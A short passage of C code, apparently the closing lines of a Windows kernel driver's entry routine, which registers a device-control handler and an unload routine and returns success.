    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDeviceControl;
    DriverObject->DriverUnload = UnloadDriver;
    return STATUS_SUCCESS;
}